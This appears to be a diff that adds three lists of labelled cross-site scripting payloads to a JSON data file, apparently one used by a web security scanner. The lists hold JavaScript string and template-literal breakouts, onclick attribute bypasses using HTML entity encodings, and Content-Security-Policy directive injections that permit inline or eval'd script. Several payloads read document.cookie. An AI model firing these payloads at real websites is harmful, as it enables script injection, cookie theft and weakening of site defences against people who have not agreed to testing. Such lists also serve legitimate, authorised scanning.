@@ -245,5 +245,135 @@
                 "generic-js"
             ]
         ]
-    }
+    },
+    "JS_CONTEXT_PAYLOADS": [
+        [
+            "\\'-alert(1)//",
+            "js-string-backslash-escape"
+        ],
+        [
+            "\\'-alert(document.domain)//",
+            "js-string-backslash-domain"
+        ],
+        [
+            "\\'-alert(document.cookie)//",
+            "js-string-backslash-cookie"
+        ],
+        [
+            "\\\\\\'-alert(1)//",
+            "js-string-double-backslash"
+        ],
+        [
+            "\\'-confirm(1)//",
+            "js-string-backslash-confirm"
+        ],
+        [
+            "\\'-prompt(1)//",
+            "js-string-backslash-prompt"
+        ],
+        [
+            "\\\"\\-alert(1)//",
+            "js-string-dblquote-backslash"
+        ],
+        [
+            "${alert(1)}",
+            "template-literal-alert"
+        ],
+        [
+            "${alert(document.domain)}",
+            "template-literal-domain"
+        ],
+        [
+            "${alert(document.cookie)}",
+            "template-literal-cookie"
+        ],
+        [
+            "${confirm(1)}",
+            "template-literal-confirm"
+        ],
+        [
+            "${prompt(1)}",
+            "template-literal-prompt"
+        ],
+        [
+            "${7*7}",
+            "template-literal-math-check"
+        ],
+        [
+            ";}-alert(1)//",
+            "js-block-breakout"
+        ],
+        [
+            "'-alert(1)-'",
+            "js-inline-single-dash"
+        ],
+        [
+            "\"-alert(1)-\"",
+            "js-inline-double-dash"
+        ]
+    ],
+    "ONCLICK_BYPASS_PAYLOADS": [
+        [
+            "http://foo?&apos;-alert(1)-&apos;",
+            "onclick-apos-entity"
+        ],
+        [
+            "http://foo?&apos;-alert(document.domain)-&apos;",
+            "onclick-apos-domain"
+        ],
+        [
+            "http://foo?&apos;-alert(document.cookie)-&apos;",
+            "onclick-apos-cookie"
+        ],
+        [
+            "http://foo?&apos;-confirm(1)-&apos;",
+            "onclick-apos-confirm"
+        ],
+        [
+            "http://foo?&apos;-prompt(1)-&apos;",
+            "onclick-apos-prompt"
+        ],
+        [
+            "http://foo?'-alert(1)-'",
+            "onclick-raw-single"
+        ],
+        [
+            "http://foo?'-confirm(1)-'",
+            "onclick-raw-confirm"
+        ],
+        [
+            "http://foo?&quot;-alert(1)-&quot;",
+            "onclick-quot-entity"
+        ],
+        [
+            "http://foo?&#x27;-alert(1)-&#x27;",
+            "onclick-hex-entity"
+        ],
+        [
+            "http://foo?&#39;-alert(1)-&#39;",
+            "onclick-dec-entity"
+        ]
+    ],
+    "CSP_BYPASS_DIRECTIVES": [
+        [
+            ";script-src-elem 'unsafe-inline'",
+            "csp-script-src-elem-unsafe"
+        ],
+        [
+            ";script-src 'unsafe-inline'",
+            "csp-script-src-unsafe"
+        ],
+        [
+            ";script-src-elem 'unsafe-inline' 'unsafe-eval'",
+            "csp-script-src-elem-both"
+        ],
+        [
+            ";default-src 'unsafe-inline'",
+            "csp-default-src-unsafe"
+        ],
+        [
+            ";script-src *",
+            "csp-script-src-wildcard"
+        ]
+    ]
 }
